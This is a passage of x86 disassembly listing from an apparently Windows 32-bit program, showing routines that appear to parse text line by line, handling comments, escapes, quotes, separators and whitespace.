  408d42:	lea    ecx,[ebp-0x210]
  408d48:	call   0x40dd18
  408d4d:	mov    edi,eax
  408d4f:	mov    DWORD PTR [ebp-0x428],edi
  408d55:	jmp    0x408df6
  408d5a:	mov    edx,0x401890
  408d5f:	mov    ecx,edi
  408d61:	call   0x40f94c
  408d66:	mov    DWORD PTR [ebp-0x42c],eax
  408d6c:	test   eax,eax
  408d6e:	jne    0x408d83
  408d70:	push   edi
  408d71:	push   0x41e
  408d76:	push   DWORD PTR ds:0x4216d4
  408d7c:	call   0x405021
  408d81:	jmp    0x408df3
  408d83:	mov    edi,DWORD PTR ds:0x437540
  408d89:	push   0x3c
  408d8b:	pop    eax
  408d8c:	push   eax
  408d8d:	push   DWORD PTR [esi]
  408d8f:	call   edi
  408d91:	pop    ecx
  408d92:	pop    ecx
  408d93:	mov    edx,eax
  408d95:	push   0x3c
  408d97:	lea    eax,[edx+0x2]
  408d9a:	pop    ecx
  408d9b:	cmp    WORD PTR [eax],cx
  408d9e:	je     0x408db8
  408da0:	push   ecx
  408da1:	pop    esi
  408da2:	push   esi
  408da3:	push   eax
  408da4:	call   edi
  408da6:	mov    edx,eax
  408da8:	pop    ecx
  408da9:	lea    eax,[edx+0x2]
  408dac:	pop    ecx
  408dad:	cmp    WORD PTR [eax],si
  408db0:	jne    0x408da2
  408db2:	mov    esi,DWORD PTR [ebp-0x420]
  408db8:	lea    edi,[edx+0x4]
  408dbb:	mov    ecx,edi
  408dbd:	lea    eax,[ecx+0x2]
  408dc0:	mov    DWORD PTR [ebp-0x424],eax
  408dc6:	mov    ax,WORD PTR [ecx]
  408dc9:	add    ecx,0x2
  408dcc:	cmp    ax,WORD PTR [ebp-0x434]
  408dd3:	jne    0x408dc6
  408dd5:	sub    ecx,DWORD PTR [ebp-0x424]
  408ddb:	sar    ecx,1
  408ddd:	lea    eax,[ecx*2+0x2]
  408de4:	push   eax
  408de5:	push   edi
  408de6:	push   edx
  408de7:	call   DWORD PTR ds:0x437444
  408ded:	mov    edi,DWORD PTR [ebp-0x428]
  408df3:	add    esp,0xc
  408df6:	mov    eax,DWORD PTR [esi]
  408df8:	mov    ecx,DWORD PTR [ebp-0x42c]
  408dfe:	mov    DWORD PTR [ebp-0x424],eax
  408e04:	lea    eax,[ebp-0x419]
  408e0a:	push   eax
  408e0b:	push   DWORD PTR [ebp+0xc]
  408e0e:	lea    eax,[ebp-0x430]
  408e14:	push   eax
  408e15:	mov    edx,edi
  408e17:	call   0x4088d2
  408e1c:	mov    edi,DWORD PTR [ebp-0x430]
  408e22:	push   0xa
  408e24:	pop    eax
  408e25:	push   eax
  408e26:	push   edi
  408e27:	call   DWORD PTR ds:0x437540
  408e2d:	pop    ecx
  408e2e:	pop    ecx
  408e2f:	test   eax,eax
  408e31:	je     0x408e38
  408e33:	add    eax,0x2
  408e36:	jmp    0x408e53
  408e38:	mov    ecx,edi
  408e3a:	lea    edx,[ecx+0x2]
  408e3d:	mov    ax,WORD PTR [ecx]
  408e40:	add    ecx,0x2
  408e43:	cmp    ax,WORD PTR [ebp-0x434]
  408e4a:	jne    0x408e3d
  408e4c:	sub    ecx,edx
  408e4e:	sar    ecx,1
  408e50:	lea    eax,[edi+ecx*2]
  408e53:	push   DWORD PTR [ebp-0x42c]
  408e59:	mov    DWORD PTR [ebp-0x430],eax
  408e5f:	call   DWORD PTR ds:0x4373e0
  408e65:	cmp    BYTE PTR [ebp-0x419],0x0
  408e6c:	pop    ecx
  408e6d:	jne    0x408e9b
  408e6f:	call   0x40dcc8
  408e74:	mov    ecx,DWORD PTR [ebp-0x428]
  408e7a:	mov    edi,eax
  408e7c:	call   0x40dd18
  408e81:	mov    DWORD PTR [edi+0x4],eax
  408e84:	mov    ecx,DWORD PTR ds:0x432428
  408e8a:	mov    edx,0x432428
  408e8f:	jmp    0x408e95
  408e91:	mov    edx,ecx
  408e93:	mov    ecx,DWORD PTR [edx]
  408e95:	test   ecx,ecx
  408e97:	jne    0x408e91
  408e99:	mov    DWORD PTR [edx],edi
  408e9b:	push   DWORD PTR [ebp-0x428]
  408ea1:	call   DWORD PTR ds:0x43754c
  408ea7:	pop    ecx
  408ea8:	lea    ecx,[ebp-0x424]
  408eae:	call   0x40826f
  408eb3:	test   eax,eax
  408eb5:	je     0x408ebe
  408eb7:	xor    ecx,ecx
  408eb9:	jmp    0x408ba9
  408ebe:	mov    edi,DWORD PTR [ebp-0x43c]
  408ec4:	cmp    edi,ebx
  408ec6:	je     0x408ed0
  408ec8:	push   edi
  408ec9:	call   DWORD PTR ds:0x43754c
  408ecf:	pop    ecx
  408ed0:	mov    al,0x1
  408ed2:	mov    ecx,DWORD PTR [ebp-0x4]
  408ed5:	pop    edi
  408ed6:	pop    esi
  408ed7:	xor    ecx,ebp
  408ed9:	pop    ebx
  408eda:	call   0x40fd0b
  408edf:	leave  
  408ee0:	ret    0x8
  408ee3:	call   0x40fe50
  408ee8:	int3   
  408ee9:	push   ecx
  408eea:	push   DWORD PTR ds:0x421f0c
  408ef0:	call   DWORD PTR ds:0x4373e0
  408ef6:	pop    ecx
  408ef7:	cmp    eax,0xffff
  408efc:	jne    0x408f13
  408efe:	push   DWORD PTR ds:0x421f14
  408f04:	push   0x424
  408f09:	push   0x0
  408f0b:	call   0x405021
  408f10:	add    esp,0xc
  408f13:	push   DWORD PTR ds:0x421f14
  408f19:	call   DWORD PTR ds:0x43754c
  408f1f:	pop    ecx
  408f20:	mov    ecx,DWORD PTR ds:0x432354
  408f26:	dec    ecx
  408f27:	mov    DWORD PTR ds:0x432354,ecx
  408f2d:	imul   ecx,ecx,0xc
  408f30:	mov    eax,DWORD PTR [ecx+0x432360]
  408f36:	mov    ds:0x421f0c,eax
  408f3b:	mov    eax,DWORD PTR [ecx+0x43235c]
  408f41:	mov    ds:0x421f14,eax
  408f46:	mov    eax,DWORD PTR [ecx+0x432358]
  408f4c:	mov    ds:0x4216d4,eax
  408f51:	pop    ecx
  408f52:	ret    
  408f53:	push   ebx
  408f54:	mov    bl,cl
  408f56:	mov    BYTE PTR ds:0x411021,0x0
  408f5d:	test   bl,bl
  408f5f:	je     0x408f70
  408f61:	push   DWORD PTR ds:0x421f0c
  408f67:	call   DWORD PTR ds:0x437460
  408f6d:	pop    ecx
  408f6e:	jmp    0x408f75
  408f70:	call   0x4076fe
  408f75:	movzx  eax,ax
  408f78:	mov    ecx,0xffff
  408f7d:	cmp    ax,cx
  408f80:	je     0x408fd6
  408f82:	cmp    ax,0xa
  408f86:	jne    0x408f5d
  408f88:	mov    BYTE PTR ds:0x411021,0x1
  408f8f:	test   bl,bl
  408f91:	je     0x408fa2
  408f93:	push   DWORD PTR ds:0x421f0c
  408f99:	call   DWORD PTR ds:0x437460
  408f9f:	pop    ecx
  408fa0:	jmp    0x408fa7
  408fa2:	call   0x4076fe
  408fa7:	movzx  eax,ax
  408faa:	cmp    ax,0x3b
  408fae:	jne    0x408fb9
  408fb0:	cmp    BYTE PTR ds:0x421f11,0x0
  408fb7:	jne    0x408fbf
  408fb9:	cmp    ax,0x23
  408fbd:	jne    0x408fc7
  408fbf:	inc    DWORD PTR ds:0x4216d4
  408fc5:	jmp    0x408f56
  408fc7:	push   DWORD PTR ds:0x421f0c
  408fcd:	push   eax
  408fce:	call   DWORD PTR ds:0x437464
  408fd4:	pop    ecx
  408fd5:	pop    ecx
  408fd6:	pop    ebx
  408fd7:	ret    
  408fd8:	push   ecx
  408fd9:	push   esi
  408fda:	push   edi
  408fdb:	push   0xa
  408fdd:	mov    si,cx
  408fe0:	pop    edi
  408fe1:	cmp    si,di
  408fe4:	je     0x408ff0
  408fe6:	mov    eax,0xffff
  408feb:	cmp    si,ax
  408fee:	jne    0x409002
  408ff0:	push   0x407
  408ff5:	push   DWORD PTR ds:0x4216d4
  408ffb:	call   0x405021
  409000:	pop    ecx
  409001:	pop    ecx
  409002:	push   DWORD PTR ds:0x421f0c
  409008:	mov    WORD PTR ds:0x4216f0,si
  40900f:	push   0x3ff
  409014:	push   0x4216f2
  409019:	call   DWORD PTR ds:0x4373d8
  40901f:	add    esp,0xc
  409022:	test   eax,eax
  409024:	jne    0x409061
  409026:	push   DWORD PTR ds:0x421f0c
  40902c:	call   DWORD PTR ds:0x437468
  409032:	pop    ecx
  409033:	test   eax,eax
  409035:	je     0x40904f
  409037:	push   0x401878
  40903c:	push   0x409
  409041:	push   DWORD PTR ds:0x4216d4
  409047:	call   0x405021
  40904c:	add    esp,0xc
  40904f:	push   0x41d
  409054:	push   DWORD PTR ds:0x4216d4
  40905a:	call   0x405021
  40905f:	pop    ecx
  409060:	pop    ecx
  409061:	mov    ecx,0x4216f0
  409066:	mov    edx,ecx
  409068:	lea    esi,[edx+0x2]
  40906b:	mov    ax,WORD PTR [edx]
  40906e:	add    edx,0x2
  409071:	test   ax,ax
  409074:	jne    0x40906b
  409076:	sub    edx,esi
  409078:	sar    edx,1
  40907a:	lea    edx,[edx*2-0x2]
  409081:	cmp    WORD PTR [edx+0x4216f0],di
  409088:	jne    0x40909b
  40908a:	cmp    edx,0x800
  409090:	jae    0x4090b6
  409092:	xor    eax,eax
  409094:	mov    WORD PTR [edx+0x4216f0],ax
  40909b:	movzx  eax,WORD PTR [ecx]
  40909e:	cmp    eax,0x20
  4090a1:	je     0x4090a8
  4090a3:	cmp    eax,0x9
  4090a6:	jne    0x4090ad
  4090a8:	add    ecx,0x2
  4090ab:	jmp    0x40909b
  4090ad:	call   0x409cef
  4090b2:	pop    edi
  4090b3:	pop    esi
  4090b4:	pop    ecx
  4090b5:	ret    
  4090b6:	call   0x40fe50
  4090bb:	int3   
  4090bc:	push   ebp
  4090bd:	mov    ebp,esp
  4090bf:	and    esp,0xfffffff8
  4090c2:	push   ecx
  4090c3:	push   ebx
  4090c4:	push   esi
  4090c5:	push   edi
  4090c6:	mov    edi,edx
  4090c8:	mov    dl,BYTE PTR ds:0x411021
  4090ce:	movzx  eax,cx
  4090d1:	sub    eax,0xa
  4090d4:	je     0x409167
  4090da:	sub    eax,0x30
  4090dd:	je     0x409298
  4090e3:	dec    eax
  4090e4:	je     0x409294
  4090ea:	dec    eax
  4090eb:	dec    eax
  4090ec:	je     0x409290
  4090f2:	mov    ebx,DWORD PTR ds:0x437464
  4090f8:	sub    eax,0x1e
  4090fb:	je     0x4091f4
  409101:	sub    eax,0x3
  409104:	je     0x409201
  40910a:	sub    eax,0xffa1
  40910f:	jne    0x40920f
  409115:	push   DWORD PTR ds:0x421f0c
  40911b:	call   DWORD PTR ds:0x437468
  409121:	pop    ecx
  409122:	test   eax,eax
  409124:	jne    0x409138
  409126:	push   0x40e
  40912b:	push   DWORD PTR ds:0x4216d4
  409131:	call   0x405021
  409136:	pop    ecx
  409137:	pop    ecx
  409138:	cmp    DWORD PTR ds:0x432354,0x0
  40913f:	je     0x409148
  409141:	call   0x408ee9
  409146:	jmp    0x409167
  409148:	cmp    DWORD PTR ds:0x411024,0x0
  40914f:	jl     0x4091ed
  409155:	push   0x3fc
  40915a:	push   DWORD PTR ds:0x4216d4
  409160:	call   0x405021
  409165:	pop    ecx
  409166:	pop    ecx
  409167:	inc    DWORD PTR ds:0x4216d4
  40916d:	mov    BYTE PTR ds:0x411021,0x1
  409174:	call   0x4076fe
  409179:	movzx  ecx,ax
  40917c:	cmp    ecx,0x3b
  40917f:	jne    0x40918a
  409181:	cmp    BYTE PTR ds:0x421f11,0x0
  409188:	jne    0x40918f
  40918a:	cmp    ecx,0x23
  40918d:	jne    0x4091ab
  40918f:	xor    cl,cl
  409191:	call   0x408f53
  409196:	inc    DWORD PTR ds:0x4216d4
  40919c:	mov    BYTE PTR ds:0x411021,0x1
  4091a3:	call   0x4076fe
  4091a8:	movzx  ecx,ax
  4091ab:	cmp    cx,0x20
  4091af:	je     0x4092c3
  4091b5:	cmp    cx,0x9
  4091b9:	je     0x4092c3
  4091bf:	mov    eax,0xffff
  4091c4:	mov    dl,0x1
  4091c6:	mov    BYTE PTR ds:0x411021,dl
  4091cc:	cmp    cx,ax
  4091cf:	je     0x4090ce
  4091d5:	mov    bl,0x11
  4091d7:	push   DWORD PTR ds:0x421f0c
  4091dd:	push   ecx
  4091de:	call   DWORD PTR ds:0x437464
  4091e4:	pop    ecx
  4091e5:	pop    ecx
  4091e6:	mov    al,bl
  4091e8:	jmp    0x4092cc
  4091ed:	mov    al,0x17
  4091ef:	jmp    0x4092cc
  4091f4:	cmp    BYTE PTR ds:0x421f11,0x0
  4091fb:	je     0x409201
  4091fd:	test   dl,dl
  4091ff:	jne    0x4091ed
  409201:	push   DWORD PTR ds:0x421f0c
  409207:	push   ecx
  409208:	call   ebx
  40920a:	pop    ecx
  40920b:	pop    ecx
  40920c:	sub    edi,0x2
  40920f:	mov    edx,DWORD PTR [ebp+0x8]
  409212:	lea    ecx,[edi-0x2]
  409215:	call   0x409a6e
  40921a:	cmp    BYTE PTR ds:0x411021,0x0
  409221:	je     0x409285
  409223:	push   0x40192c
  409228:	push   0x4216f0
  40922d:	call   DWORD PTR ds:0x437548
  409233:	pop    ecx
  409234:	pop    ecx
  409235:	test   eax,eax
  409237:	jne    0x409285
  409239:	xor    cl,cl
  40923b:	mov    ds:0x411021,al
  409240:	call   0x40937a
  409245:	movzx  esi,ax
  409248:	cmp    esi,0x3a
  40924b:	je     0x409278
  40924d:	cmp    esi,0x3d
  409250:	je     0x409278
  409252:	cmp    BYTE PTR ds:0x421f11,0x0
  409259:	je     0x40926f
  40925b:	push   edi
  40925c:	push   0x409
  409261:	push   DWORD PTR ds:0x4216d4
  409267:	call   0x405021
  40926c:	add    esp,0xc
  40926f:	mov    ecx,esi
  409271:	call   0x408fd8
  409276:	jmp    0x4092cc
  409278:	push   DWORD PTR ds:0x421f0c
  40927e:	push   esi
  40927f:	call   ebx
  409281:	pop    ecx
  409282:	pop    ecx
  409283:	jmp    0x40928c
  409285:	mov    BYTE PTR ds:0x411021,0x0
  40928c:	mov    al,0x10
  40928e:	jmp    0x4092cc
  409290:	mov    al,0x16
  409292:	jmp    0x4092c5
  409294:	mov    al,0x13
  409296:	jmp    0x4092c5
  409298:	mov    BYTE PTR ds:0x411021,0x0
  40929f:	call   0x4076fe
  4092a4:	movzx  ecx,ax
  4092a7:	push   0x3a
  4092a9:	pop    eax
  4092aa:	cmp    cx,ax
  4092ad:	jne    0x4092bc
  4092af:	mov    WORD PTR [edi],ax
  4092b2:	xor    eax,eax
  4092b4:	mov    WORD PTR [edi+0x2],ax
  4092b8:	mov    al,0x15
  4092ba:	jmp    0x4092cc
  4092bc:	mov    bl,0x14
  4092be:	jmp    0x4091d7
  4092c3:	mov    al,0x12
  4092c5:	mov    BYTE PTR ds:0x411021,0x0
  4092cc:	pop    edi
  4092cd:	pop    esi
  4092ce:	pop    ebx
  4092cf:	mov    esp,ebp
  4092d1:	pop    ebp
  4092d2:	ret    0x4
  4092d5:	cmp    BYTE PTR ds:0x421f12,0x0
  4092dc:	push   ebx
  4092dd:	mov    bl,dl
  4092df:	je     0x409340
  4092e1:	inc    DWORD PTR ds:0x4216d4
  4092e7:	mov    BYTE PTR ds:0x421f12,0x0
  4092ee:	call   0x4076fe
  4092f3:	movzx  eax,ax
  4092f6:	cmp    eax,0x20
  4092f9:	je     0x409335
  4092fb:	cmp    eax,0x9
  4092fe:	je     0x409335
  409300:	mov    ecx,0xffff
  409305:	mov    BYTE PTR ds:0x411021,0x1
  40930c:	cmp    ax,cx
  40930f:	jne    0x409322
  409311:	mov    edx,0x4216f0
  409316:	push   0x421ef0
  40931b:	call   0x4090bc
  409320:	pop    ebx
  409321:	ret    
  409322:	push   DWORD PTR ds:0x421f0c
  409328:	push   eax
  409329:	call   DWORD PTR ds:0x437464
  40932f:	pop    ecx
  409330:	pop    ecx
  409331:	mov    al,0x11
  409333:	pop    ebx
  409334:	ret    
  409335:	mov    BYTE PTR ds:0x411021,0x0
  40933c:	mov    al,0x12
  40933e:	pop    ebx
  40933f:	ret    
  409340:	cmp    bl,0x18
  409343:	je     0x40936a
  409345:	cmp    bl,0x19
  409348:	je     0x40936a
  40934a:	xor    cl,cl
  40934c:	call   0x40937a
  409351:	movzx  ecx,ax
  409354:	xor    eax,eax
  409356:	mov    WORD PTR ds:0x4216f0,cx
  40935d:	mov    ds:0x4216f2,ax
  409363:	mov    edx,0x4216f2
  409368:	jmp    0x409316
  40936a:	push   0x421ef0
  40936f:	mov    cl,bl
  409371:	call   0x409508
  409376:	mov    al,bl
  409378:	pop    ebx
  409379:	ret    
  40937a:	push   ebx
  40937b:	push   edi
  40937c:	push   0x5e
  40937e:	mov    bl,cl
  409380:	pop    edi
  409381:	test   bl,bl
  409383:	je     0x409394
  409385:	push   DWORD PTR ds:0x421f0c
  40938b:	call   DWORD PTR ds:0x437460
  409391:	pop    ecx
  409392:	jmp    0x409399
  409394:	call   0x4076fe
  409399:	movzx  eax,ax
  40939c:	push   0x20
  40939e:	pop    ecx
  40939f:	cmp    ax,cx
  4093a2:	je     0x4093b1
  4093a4:	push   0x9
  4093a6:	pop    ecx
  4093a7:	cmp    ax,cx
  4093aa:	je     0x4093b1
  4093ac:	cmp    ax,di
  4093af:	jne    0x4093e8
  4093b1:	cmp    ax,di
  4093b4:	jne    0x4093e1
  4093b6:	test   bl,bl
  4093b8:	je     0x4093c9
  4093ba:	push   DWORD PTR ds:0x421f0c
  4093c0:	call   DWORD PTR ds:0x437460
  4093c6:	pop    ecx
  4093c7:	jmp    0x4093ce
  4093c9:	call   0x4076fe
  4093ce:	movzx  eax,ax
  4093d1:	push   0x20
  4093d3:	pop    ecx
  4093d4:	cmp    ax,cx
  4093d7:	je     0x4093e1
  4093d9:	push   0x9
  4093db:	pop    ecx
  4093dc:	cmp    ax,cx
  4093df:	jne    0x409414
  4093e1:	mov    BYTE PTR ds:0x411021,0x0
  4093e8:	push   0x5c
  4093ea:	pop    ecx
  4093eb:	cmp    ax,cx
  4093ee:	jne    0x4093fa
  4093f0:	mov    dl,bl
  4093f2:	call   0x409457
  4093f7:	movzx  eax,ax
  4093fa:	push   0x20
  4093fc:	pop    ecx
  4093fd:	cmp    ax,cx
  409400:	je     0x409381
  409406:	push   0x9
  409408:	pop    ecx
  409409:	cmp    ax,cx
  40940c:	je     0x409381
  409412:	jmp    0x409425
  409414:	push   DWORD PTR ds:0x421f0c
  40941a:	push   eax
  40941b:	call   DWORD PTR ds:0x437464
  409421:	pop    ecx
  409422:	pop    ecx
  409423:	mov    eax,edi
  409425:	cmp    ax,0x3b
  409429:	jne    0x40943d
  40942b:	cmp    BYTE PTR ds:0x411021,0x0
  409432:	je     0x409454
  409434:	cmp    BYTE PTR ds:0x421f11,0x0
  40943b:	jne    0x409443
  40943d:	cmp    ax,0x23
  409441:	jne    0x409454
  409443:	mov    cl,bl
  409445:	call   0x408f53
  40944a:	push   0xa
  40944c:	pop    eax
  40944d:	mov    BYTE PTR ds:0x411021,0x1
  409454:	pop    edi
  409455:	pop    ebx
  409456:	ret    
  409457:	push   ebx
  409458:	push   esi
  409459:	push   edi
  40945a:	push   0x5c
  40945c:	pop    edi
  40945d:	mov    bl,dl
  40945f:	cmp    cx,di
  409462:	jne    0x4094ed
  409468:	mov    esi,DWORD PTR ds:0x437460
  40946e:	test   bl,bl
  409470:	je     0x40947d
  409472:	push   DWORD PTR ds:0x421f0c
  409478:	call   esi
  40947a:	pop    ecx
  40947b:	jmp    0x409482
  40947d:	call   0x4076fe
  409482:	movzx  eax,ax
  409485:	cmp    ax,0xa
  409489:	jne    0x4094f4
  40948b:	inc    DWORD PTR ds:0x4216d4
  409491:	mov    BYTE PTR ds:0x411021,0x1
  409498:	test   bl,bl
  40949a:	je     0x4094a7
  40949c:	push   DWORD PTR ds:0x421f0c
  4094a2:	call   esi
  4094a4:	pop    ecx
  4094a5:	jmp    0x4094ac
  4094a7:	call   0x4076fe
  4094ac:	movzx  ecx,ax
  4094af:	cmp    cx,0x3b
  4094b3:	jne    0x4094be
  4094b5:	cmp    BYTE PTR ds:0x421f11,0x0
  4094bc:	jne    0x4094c4
  4094be:	cmp    cx,0x23
  4094c2:	jne    0x4094e8
  4094c4:	mov    cl,bl
  4094c6:	call   0x408f53
  4094cb:	inc    DWORD PTR ds:0x4216d4
  4094d1:	test   bl,bl
  4094d3:	je     0x4094e0
  4094d5:	push   DWORD PTR ds:0x421f0c
  4094db:	call   esi
  4094dd:	pop    ecx
  4094de:	jmp    0x4094e5
  4094e0:	call   0x4076fe
  4094e5:	movzx  ecx,ax
  4094e8:	cmp    cx,di
  4094eb:	je     0x40946e
  4094ed:	mov    ax,cx
  4094f0:	pop    edi
  4094f1:	pop    esi
  4094f2:	pop    ebx
  4094f3:	ret    
  4094f4:	push   DWORD PTR ds:0x421f0c
  4094fa:	push   eax
  4094fb:	call   DWORD PTR ds:0x437464
  409501:	pop    ecx
  409502:	pop    ecx
  409503:	mov    ax,di
  409506:	jmp    0x4094f0
  409508:	push   ebp
  409509:	mov    ebp,esp
  40950b:	sub    esp,0x14
  40950e:	push   ebx
  40950f:	push   esi
  409510:	xor    edx,edx
  409512:	mov    bl,cl
  409514:	mov    esi,0x4216f0
  409519:	push   edi
  40951a:	mov    BYTE PTR [ebp-0x3],bl
  40951d:	mov    DWORD PTR [ebp-0x8],edx
  409520:	mov    BYTE PTR [ebp-0x2],dl
  409523:	mov    DWORD PTR [ebp-0xc],esi
  409526:	call   0x4076fe
  40952b:	push   0x5e
  40952d:	pop    edx
  40952e:	push   0x2
  409530:	movzx  edi,ax
  409533:	pop    eax
  409534:	push   0x9
  409536:	mov    DWORD PTR [ebp-0x10],0x20
  40953d:	pop    ecx
  40953e:	cmp    bl,0x18
  409541:	jne    0x409547
  409543:	mov    bh,al
  409545:	jmp    0x4095b3
  409547:	cmp    di,WORD PTR [ebp-0x10]
  40954b:	je     0x40958d
  40954d:	cmp    di,cx
  409550:	je     0x40958d
  409552:	cmp    di,dx
  409555:	jne    0x4095b1
  409557:	call   0x4076fe
  40955c:	movzx  eax,ax
  40955f:	push   0x20
  409561:	pop    ecx
  409562:	cmp    ax,cx
  409565:	je     0x40958a
  409567:	push   0x9
  409569:	pop    ecx
  40956a:	cmp    ax,cx
  40956d:	je     0x40958a
  40956f:	push   DWORD PTR ds:0x421f0c
  409575:	push   eax
  409576:	call   DWORD PTR ds:0x437464
  40957c:	pop    ecx
  40957d:	pop    ecx
  40957e:	push   0x5e
  409580:	mov    bh,0x1
  409582:	pop    edx
  409583:	mov    BYTE PTR [ebp-0x1],bh
  409586:	mov    edi,edx
  409588:	jmp    0x40959f
  40958a:	push   0x2
  40958c:	pop    eax
  40958d:	mov    bh,al
  40958f:	xor    cl,cl
  409591:	mov    BYTE PTR [ebp-0x1],bh
  409594:	call   0x40937a
  409599:	push   0x5e
  40959b:	movzx  edi,ax
  40959e:	pop    edx
  40959f:	cmp    di,0x22
  4095a3:	jne    0x4095b8
  4095a5:	cmp    BYTE PTR [ebp-0x2],0x0
  4095a9:	sete   al
  4095ac:	mov    BYTE PTR [ebp-0x2],al
  4095af:	jmp    0x4095bb
  4095b1:	mov    bh,0x1
  4095b3:	mov    BYTE PTR [ebp-0x1],bh
  4095b6:	jmp    0x40959f
  4095b8:	mov    al,BYTE PTR [ebp-0x2]
  4095bb:	cmp    di,dx
  4095be:	jne    0x4097c0
  4095c4:	test   al,al
  4095c6:	jne    0x4097a4
  4095cc:	cmp    bl,0x19
  4095cf:	jne    0x4097a4
  4095d5:	call   0x4076fe
  4095da:	movzx  edi,ax
  4095dd:	mov    eax,edi
  4095df:	cmp    eax,0x2d
  4095e2:	jg     0x40961b
  4095e4:	je     0x40963d
  4095e6:	cmp    eax,0xa
  4095e9:	je     0x4096eb
  4095ef:	cmp    eax,0x21
  4095f2:	je     0x40963d
  4095f4:	jle    0x4097c0
  4095fa:	cmp    eax,0x23
  4095fd:	jle    0x4096eb
  409603:	cmp    eax,0x24
  409606:	je     0x40963d
  409608:	cmp    eax,0x27
  40960b:	jle    0x4097c0
  409611:	cmp    eax,0x29
  409614:	jle    0x40963d
  409616:	jmp    0x4097c0
  40961b:	sub    eax,0x40
  40961e:	je     0x40963d
  409620:	sub    eax,0x1c
  409623:	je     0x4096eb
  409629:	push   0x2
  40962b:	pop    ecx
  40962c:	sub    eax,ecx
  40962e:	je     0x40963d
  409630:	sub    eax,0x1d
  409633:	je     0x40963d
  409635:	sub    eax,ecx
  409637:	jne    0x4097c3
  40963d:	push   0x5e
  40963f:	pop    eax
  409640:	push   0x2
  409642:	pop    ebx
  409643:	mov    WORD PTR [esi],ax
  409646:	add    esi,ebx
  409648:	cmp    esi,DWORD PTR [ebp+0x8]
  40964b:	jne    0x4096eb
  409651:	mov    ecx,DWORD PTR ds:0x4216dc
  409657:	test   ecx,ecx
  409659:	jne    0x4096a1
  40965b:	mov    eax,0x800
  409660:	mul    ebx
  409662:	seto   cl
  409665:	neg    ecx
  409667:	or     ecx,eax
  409669:	call   0x40a2fb
  40966e:	push   0x400
  409673:	push   DWORD PTR [ebp-0xc]
  409676:	mov    ebx,0x800
  40967b:	push   ebx
  40967c:	push   eax
  40967d:	mov    ds:0x4216dc,eax
  409682:	call   DWORD PTR ds:0x43746c
  409688:	mov    eax,ds:0x4216dc
  40968d:	add    esp,0x10
  409690:	lea    ecx,[eax+0x1000]
  409696:	lea    esi,[eax+0x800]
  40969c:	mov    DWORD PTR [ebp+0x8],ecx
  40969f:	jmp    0x4096e0
  4096a1:	mov    esi,DWORD PTR [ebp-0x8]
  4096a4:	lea    ebx,[esi+0x400]
  4096aa:	cmp    ebx,esi
  4096ac:	jb     0x4096bd
  4096ae:	lea    edx,[ebx+ebx*1]
  4096b1:	call   0x40a33e
  4096b6:	mov    DWORD PTR [ebp-0x10],eax
  4096b9:	test   eax,eax
  4096bb:	jne    0x4096d2
  4096bd:	push   0x419
  4096c2:	push   DWORD PTR ds:0x4216d4
  4096c8:	call   0x405021
  4096cd:	mov    eax,DWORD PTR [ebp-0x10]
  4096d0:	pop    ecx
  4096d1:	pop    ecx
  4096d2:	mov    ds:0x4216dc,eax
  4096d7:	lea    esi,[eax+esi*2]
  4096da:	lea    eax,[eax+ebx*2]
  4096dd:	mov    DWORD PTR [ebp+0x8],eax
  4096e0:	mov    eax,ds:0x4216dc
  4096e5:	mov    DWORD PTR [ebp-0x8],ebx
  4096e8:	mov    DWORD PTR [ebp-0xc],eax
  4096eb:	xor    bl,bl
  4096ed:	movzx  ecx,BYTE PTR [ebp-0x1]
  4096f1:	imul   ecx,ecx,0xe
  4096f4:	movzx  eax,bl
  4096f7:	mov    bl,BYTE PTR [ebp-0x3]
  4096fa:	mov    bh,BYTE PTR [ecx+eax*1+0x4013d8]
  409701:	mov    BYTE PTR [ebp-0x1],bh
  409704:	cmp    bh,0x40
  409707:	je     0x409a0b
  40970d:	test   bh,0x20
  409710:	je     0x409730
  409712:	movzx  eax,di
  409715:	push   eax
  409716:	movzx  eax,bh
  409719:	and    eax,0xffffffdf
  40971c:	add    eax,0x3e8
  409721:	push   eax
  409722:	push   DWORD PTR ds:0x4216d4
  409728:	call   0x405021
  40972d:	add    esp,0xc
  409730:	push   0x2
  409732:	test   bh,bh
  409734:	jne    0x40995b
  40973a:	pop    eax
  40973b:	sub    esi,eax
  40973d:	push   0x20
  40973f:	pop    edi
  409740:	mov    WORD PTR [esi],di
  409743:	add    esi,eax
  409745:	inc    DWORD PTR ds:0x4216d4
  40974b:	mov    DWORD PTR [ebp-0x14],esi
  40974e:	mov    BYTE PTR ds:0x411021,0x1
  409755:	call   0x4076fe
  40975a:	movzx  eax,ax
  40975d:	push   0x9
  40975f:	cmp    ax,di
  409762:	mov    BYTE PTR ds:0x411021,bh
  409768:	pop    edi
  409769:	je     0x409770
  40976b:	cmp    ax,di
  40976e:	jne    0x409790
  409770:	push   0x2
  409772:	pop    eax
  409773:	mov    bh,al
  409775:	push   0x20
  409777:	mov    BYTE PTR [ebp-0x1],bh
  40977a:	pop    esi
  40977b:	call   0x4076fe
  409780:	movzx  eax,ax
  409783:	cmp    ax,si
  409786:	je     0x40977b
  409788:	cmp    ax,di
  40978b:	je     0x40977b
  40978d:	mov    esi,DWORD PTR [ebp-0x14]
  409790:	push   DWORD PTR ds:0x421f0c
  409796:	push   eax
  409797:	call   DWORD PTR ds:0x437464
  40979d:	pop    ecx
  40979e:	pop    ecx
  40979f:	jmp    0x4099ef
  4097a4:	call   0x4076fe
  4097a9:	push   DWORD PTR ds:0x421f0c
  4097af:	movzx  eax,ax
  4097b2:	push   eax
  4097b3:	call   DWORD PTR ds:0x437464
  4097b9:	pop    ecx
  4097ba:	pop    ecx
  4097bb:	push   0x5e
  4097bd:	pop    eax
  4097be:	mov    edi,eax
  4097c0:	push   0x2
  4097c2:	pop    ecx
  4097c3:	movzx  eax,di
  4097c6:	cmp    eax,0x3b
  4097c9:	jg     0x409853
  4097cf:	je     0x40983a
  4097d1:	cmp    eax,0x24
  4097d4:	jg     0x409807
  4097d6:	je     0x409800
  4097d8:	push   0x9
  4097da:	pop    ecx
  4097db:	sub    eax,ecx
  4097dd:	je     0x4097f9
  4097df:	dec    eax
  4097e0:	je     0x4098f6
  4097e6:	sub    eax,0x16
  4097e9:	je     0x4097f9
  4097eb:	sub    eax,0x3
  4097ee:	je     0x409927
  4097f4:	jmp    0x4098e4
  4097f9:	mov    bl,0x5
  4097fb:	jmp    0x4096ed
  409800:	mov    bl,0x7
  409802:	jmp    0x4096ed
  409807:	sub    eax,0x28
  40980a:	je     0x409833
  40980c:	dec    eax
  40980d:	je     0x409829
  40980f:	dec    eax
  409810:	je     0x409822
  409812:	sub    eax,0x10
  409815:	jne    0x4098e4
  40981b:	mov    bl,0x4
  40981d:	jmp    0x4096ed
